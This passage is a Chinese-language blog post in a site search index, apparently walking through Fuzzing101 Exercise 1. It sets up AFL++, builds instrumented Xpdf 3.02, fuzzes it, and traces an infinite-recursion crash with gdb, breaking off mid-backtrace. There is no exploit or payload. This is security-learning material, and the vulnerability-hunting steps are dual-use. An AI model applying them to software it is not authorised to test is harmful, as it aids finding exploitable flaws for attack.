<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>1.xpdf(AFL++环境搭建）</title>
    <url>/2025/02/11/1.xpdf(AFL++%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%EF%BC%89/</url>
    <content><![CDATA[<h1 id="AFL-环境搭建："><a href="#AFL-环境搭建：" class="headerlink" title="AFL++环境搭建："></a>AFL++环境搭建：</h1><p>官方文档里面有，懒得看的话我直接贴在这里了：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get update</span><br><span class="line"><span class="built_in">sudo</span> apt-get install -y build-essential python3-dev automake cmake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools cargo libgtk-3-dev</span><br><span class="line"><span class="comment"># try to install llvm 14 and install the distro default if that fails</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install -y lld-14 llvm-14 llvm-14-dev clang-14 || <span class="built_in">sudo</span> apt-get install -y lld llvm llvm-dev clang</span><br><span class="line"><span class="built_in">sudo</span> apt-get install -y gcc-$(gcc --version|<span class="built_in">head</span> -n1|sed <span class="string">&#x27;s/\..*//&#x27;</span>|sed <span class="string">&#x27;s/.* //&#x27;</span>)-plugin-dev libstdc++-$(gcc --version|<span class="built_in">head</span> -n1|sed <span class="string">&#x27;s/\..*//&#x27;</span>|sed <span class="string">&#x27;s/.* //&#x27;</span>)-dev</span><br><span class="line"><span class="built_in">sudo</span> apt-get install -y ninja-build <span class="comment"># for QEMU mode</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install -y cpio libcapstone-dev <span class="comment"># for Nyx mode</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install -y wget curl <span class="comment"># for Frida mode</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install -y python3-pip <span class="comment"># for Unicorn mode</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/AFLplusplus/AFLplusplus</span><br><span class="line"><span class="built_in">cd</span> AFLplusplus</span><br><span class="line">make distrib</span><br><span class="line"><span class="built_in">sudo</span> make install</span><br></pre></td></tr></table></figure></div>
<p><a class="link"   href="https://github.com/antonio-morales/Fuzzing101/tree/main/Exercise%201" >Fuzzing101-xpdf链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="构建目标程序"><a href="#构建目标程序" class="headerlink" title="&lt;1&gt;.构建目标程序"></a>&lt;1&gt;.构建目标程序</h2><p>首先我们新建一个目录：</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir 01-xpdf&amp;&amp;cd 01-xpdf</span><br></pre></td></tr></table></figure></div>
<p>官网提示我们需要安装一个额外的工具：<br><code>sudo apt install build-essential</code><br>然后我们下载Xpdf 3.02版本：</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz</span><br><span class="line">tar -xvzf xpdf-3.02.tar.gz</span><br></pre></td></tr></table></figure></div>
<p>我们使用刚下载下来的源码进行构建目标：</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd xpdf-3.02</span><br><span class="line">sudo apt update &amp;&amp; sudo apt install -y build-essential gcc</span><br><span class="line">./configure --prefix=&quot;$HOME/fuzzing_xpdf/release/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>
<p>我们进行模糊测试的时候需要一些模板，下载下来：</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir pdf_examples &amp;&amp; cd pdf_examples</span><br><span class="line">wget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdf</span><br><span class="line">wget http://www.africau.edu/images/default/sample.pdf</span><br><span class="line">wget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf</span><br></pre></td></tr></table></figure></div>
<p>我当时下载的时候有一个是连接不上的。<br>从源码构建好之后，我们简单试用一下构建出来的目标，看看是否成功构建出来：<br><code>pdfinfo -box -meta ./helloworld.pdf</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/%5Cimages%5CFuzzing101/xpdf_release.png"
                      alt="xpdf_release"
                ><br>这样就说明我们构建出来的目标程序是没错的。<br>我们刚才构建的程序是没有经过插桩的，想在我们需要使用AFL++的编译器，对源码进行插桩编译：</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd $HOME/fuzzing_xpdf/xpdf-3.02/</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure></div>
<p>然后我们指定编译器为AFL++的编译器，这里官网人家使用的是afl-fast，我这里就使用afl-fast了，但是理论上来说，afl-lto的效果应该是更好的。</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set CC &#x27;/home/shad0hun/AFLplusplus-stable/afl-clang-fast&#x27;</span><br><span class="line">set CXX &#x27;/home/shad0hun/AFLplusplus-stable/afl-clang-fast++&#x27;</span><br><span class="line">./configure --prefix=&quot;$HOME/fuzzing_xpdf/fuzzing/&quot;</span><br></pre></td></tr></table></figure></div>
<p>然后我们需要重新构建：</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd $HOME/fuzzing_xpdf/xpdf-3.02/</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure></div>
<p>现在我们生成新的目标程序：</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>
<p><strong>需要注意的是，在这里，要构建fuzz版本的时候，很多教程都是叫你删除了release版本，然后重新插桩构建，我这里嫌麻烦没有删除，但是我在这个过程中遇到了一些问题：没有删除release版本，后续无法插桩，于是我尝试构建出插桩版本，再构建release版本，然后我发现，它还是会调用afl-clang-fast，但是我在后面再试的时候又构建出来了。</strong><br>问题解决：在进行构建之前，一定记得<code>make clean</code>，并且在构建之前，一定将环境变量设置正确。</p>
<h2 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="&lt;2&gt;.Fuzzing"></a>&lt;2&gt;.Fuzzing</h2><p>现在我们就可以使用AFL++对目标程序进行Fuzz了：<br><code>afl-fuzz -i $HOME/fuzzing_xpdf/pdf_examples/ -o $HOME/fuzzing_xpdf/out/ -s 123 -- $HOME/fuzzing_xpdf/install/bin/pdftotext @@ $HOME/fuzzing_xpdf/output</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/%5Cimages%5CFuzzing101/xpdf_fuzz.png"
                      alt="xpdf_fuzz"
                ></p>
<h2 id="模糊测试结果分析"><a href="#模糊测试结果分析" class="headerlink" title="&lt;3&gt;.模糊测试结果分析"></a>&lt;3&gt;.模糊测试结果分析</h2><p>可以看到，我这里已经拿到了4个导致进程crash的样本：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/%5Cimages%5CFuzzing101/xpdf_fuzz_end.png"
                      alt="xpdf_fuzz_end"
                ><br>这里<code>ctrl+C</code>手动暂停，然后我们在<code>out/default/crashes</code>目录下可以看到保存的样本：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/%5Cimages%5CFuzzing101/xpdf_crashes_sample.png"
                      alt="xpdf_crashes_sample"
                ><br>我们在<code>Fuzzing101/01/out/default/crashes</code>目录下可以看到导致进程crash的样本，这里一共是9个，我们现在要做的就是将这些样本传递给pdftotext，重现进程crash的场景；<br>这里我就是复现到无线递归漏洞，所以找了多尝试了几个样本：<br><strong>需要注意的是，这里使用附带调试信息，符号表的版本去复现，我们能更容易定位到漏洞位置</strong><br>这里使用命令<code>db --args /home/shad0hun/桌面/Fuzzing101/01-xpdf/install/bin/pdftotext /home/shad0hun/桌面/Fuzzing101/01-xpdf/out/default/crashes/id:000003,sig:11,src:000001,time:330516,execs:326081,op:havoc,rep:14  ./output</code>.<br>然后<code>run</code>。<br>这时候程序crash，gdb就会断下来，然后输入<code>bt</code>，就能看到栈回溯信息了，我这里输入bt之后直接回溯不完了，一直在滚动，这也印证了该漏洞为无限递归漏洞。<br>这里注意一下，其他导致进程crash的样本，不一定是漏洞，需要我们自己分析的。<br>这里复制一段出来，稍微分析一下异常的位置：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">#<span class="number">74633</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556b2570</span>, dict=<span class="number">0x7fffffffa390</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74634</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556b2570</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffa390</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74635</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffa390</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74636</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffa390</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffa550</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74637</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556b20b0</span>, dict=<span class="number">0x7fffffffa550</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74638</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556b20b0</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffa550</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74639</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffa550</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74640</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffa550</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffa710</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74641</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556b1bf0</span>, dict=<span class="number">0x7fffffffa710</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74642</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556b1bf0</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffa710</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74643</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffa710</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74644</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffa710</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffa8d0</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74645</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556b1730</span>, dict=<span class="number">0x7fffffffa8d0</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74646</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556b1730</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffa8d0</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74647</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffa8d0</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74648</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffa8d0</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffaa90</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74649</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556b1270</span>, dict=<span class="number">0x7fffffffaa90</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74650</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556b1270</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffaa90</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74651</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffaa90</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74652</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffaa90</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffac50</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74653</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556b0db0</span>, dict=<span class="number">0x7fffffffac50</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74654</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556b0db0</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffac50</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74655</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffac50</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74656</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffac50</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffae10</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74657</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556b08f0</span>, dict=<span class="number">0x7fffffffae10</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74658</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556b08f0</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffae10</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74659</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffae10</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74660</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffae10</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffafd0</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74661</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556b0430</span>, dict=<span class="number">0x7fffffffafd0</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74662</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556b0430</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffafd0</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74663</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffafd0</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74664</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffafd0</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffb190</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74665</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556aff70</span>, dict=<span class="number">0x7fffffffb190</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74666</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556aff70</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffb190</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74667</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffb190</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74668</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffb190</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffb350</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74669</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556afab0</span>, dict=<span class="number">0x7fffffffb350</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74670</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556afab0</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffb350</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74671</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffb350</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74672</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffb350</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffb510</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74673</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556af5f0</span>, dict=<span class="number">0x7fffffffb510</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74674</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556af5f0</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffb510</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74675</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffb510</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74676</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffb510</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffb6d0</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74677</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556af130</span>, dict=<span class="number">0x7fffffffb6d0</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74678</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556af130</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffb6d0</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74679</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffb6d0</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74680</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffb6d0</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffb890</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74681</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556aec70</span>, dict=<span class="number">0x7fffffffb890</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74682</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556aec70</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffb890</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74683</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffb890</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74684</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffb890</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffba50</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74685</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556ae7b0</span>, dict=<span class="number">0x7fffffffba50</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at 